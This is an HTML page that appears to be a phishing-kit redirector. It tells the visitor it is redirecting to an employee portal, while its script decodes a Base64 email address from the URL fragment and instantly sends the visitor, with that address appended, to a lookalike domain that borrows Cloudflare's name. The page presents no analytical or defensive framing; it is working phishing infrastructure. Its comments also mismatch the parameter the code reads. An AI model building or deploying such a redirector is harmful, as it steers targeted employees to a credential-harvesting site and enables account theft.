<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Redirector</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}#msg{background:#fff;padding:2rem 3rem;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.15)}#msg h2{margin:0 0 .5em;font-size:1.25em}#msg p{margin:0}</style>
</head>
<body>
  <div id="msg">
    <h2>Redirecting to employee portalâ€¦</h2>
    <p>If nothing happens, <a href="https://cloudflare.juthafoo.sa.com/a9GUawqzDz8xWT5Y!NbUuy3R/">reload</a>.</p>
  </div>

  <script>
  /* ---- same logic as the original PHP/JS snippet ---- */
  (function(){
    const hash = window.location.hash;          // #Farmhily=BASE64
    const m    = hash.match(/state=([A-Za-z0-9+/=]+)/);
    if (!m || !m[1]) { console.error('No valid Farmhily param'); return; }

    try {
      const email = atob(m[1]);                 // Base-64 decode
      const dest  = 'https://cloudflare.juthafoo.sa.com/a9GUawqzDz8xWT5Y!NbUuy3R/$'
                  + encodeURIComponent(email);
      window.location.replace(dest);            // instant redirect
    } catch (e) {
      console.error('Bad Base-64:',e);
    }
  })();
  </script>
</body>
</html>
